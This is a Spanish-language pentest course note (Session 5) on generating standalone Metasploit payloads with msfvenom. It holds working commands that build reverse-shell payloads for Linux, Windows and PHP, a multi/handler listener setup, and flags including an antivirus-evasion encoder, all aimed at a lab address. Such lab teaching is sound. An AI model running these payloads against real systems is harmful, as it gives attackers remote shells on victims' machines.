# 🧨 msfvenom — Generación de Payloads — Sesión 5

`msfvenom` genera payloads independientes (sin necesidad de un exploit específico) para escenarios donde ya tienes otra forma de ejecutar código en el objetivo.

---

## 🔹 Estructura básica del comando

```bash
msfvenom -p <payload> LHOST=<tu_IP> LPORT=<tu_puerto> -f <formato> -o <archivo_salida>
```

## 🔹 Ejemplos comunes

```bash
# Payload reverse shell para Linux (ELF)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.Y LPORT=4444 -f elf -o shell.elf

# Payload reverse shell para Windows (EXE)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.Y LPORT=4444 -f exe -o shell.exe

# Payload en PHP (útil si encontraste un file upload vulnerable en la Sesión 4)
msfvenom -p php/reverse_php LHOST=192.168.56.Y LPORT=4444 -f raw -o shell.php
```

## 🔹 Levantar el listener para recibir la conexión

Después de generar el payload, necesitas algo escuchando en tu Kali:

```bash
msfconsole -q -x "use exploit/multi/handler; \
set PAYLOAD linux/x86/shell_reverse_tcp; \
set LHOST 192.168.56.Y; \
set LPORT 4444; \
run"
```

## 🔹 Flags útiles

| Flag | Qué hace |
|---|---|
| `-p` | Payload a usar |
| `-f` | Formato de salida (`exe`, `elf`, `raw`, `php`, `python`, etc.) |
| `-e` | Encoder (ofuscación básica, no es garantía de evasión de antivirus) |
| `-a` | Arquitectura (`x86`, `x64`) |
| `--list payloads` | Lista todos los payloads disponibles |

---

## ✅ Checklist de esta fase

- [ ] Generé un payload correctamente con `msfvenom`
- [ ] Levanté el `multi/handler` antes de ejecutar el payload en el objetivo
- [ ] Confirmé la conexión con `sessions -l`
- [ ] Entiendo la diferencia entre generar el payload y explotar directamente con un módulo (ver `metasploit-cheatsheet.md`)
